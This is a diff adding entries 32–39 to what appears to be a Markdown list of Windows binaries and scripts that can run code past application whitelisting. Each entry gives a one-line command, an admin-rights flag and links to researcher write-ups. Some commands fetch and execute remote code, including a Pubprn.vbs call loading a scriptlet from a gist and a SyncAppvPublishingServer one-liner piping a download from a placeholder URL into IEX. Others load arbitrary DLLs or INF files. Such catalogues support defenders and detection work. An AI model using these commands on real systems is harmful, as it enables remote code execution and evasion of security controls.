@@ -461,3 +461,111 @@ https://twitter.com/Hexacorn/status/776122138063409152
 
 
 
+## 32. Pubprn.vbs
+
+`pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct`
+
+Requires admin: No
+
+Notes: 
+
+Links:
+https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
+https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
+
+
+
+## 33. slmgr.vbs
+
+`slmgr.vbs`
+
+Requires admin: No
+
+Notes: Requires registry keys for com object.
+
+Links:
+https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
+https://www.youtube.com/watch?v=3gz1QmiMhss
+
+
+
+## 34. winrm.vbs
+
+`winrm quickconfig`
+
+Requires admin: No
+
+Notes: Requires registry keys for com object.
+
+Links:
+https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
+https://www.youtube.com/watch?v=3gz1QmiMhss
+
+
+
+## 35. forfiles.exe
+
+`forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe`
+
+Requires admin: No
+
+Notes:
+
+Links:
+https://twitter.com/vector_sec/status/896049052642533376
+
+
+
+## 36. SyncAppvPublishingServer.exe
+
+`SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
+`
+
+Requires admin: No
+
+Notes:
+
+Links:
+https://twitter.com/monoxgas/status/895045566090010624
+
+
+
+## 37. InfDefaultInstall.exe
+
+`InfDefaultInstall.exe shady.inf`
+
+Requires admin: ?
+
+Notes:
+
+Links:
+https://twitter.com/KyleHanslovan/status/911997635455852544
+https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a
+
+
+
+## 38. Winword.exe
+
+`winword.exe /l dllfile.dll`
+
+Requires admin: No
+
+Notes:
+
+Links:
+https://twitter.com/subTee/status/884615369511636992
+
+
+
+## 39. Runscripthelper.exe
+
+`runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test`
+
+Requires admin: No
+
+Notes:
+
+Links:
+https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc
+
+
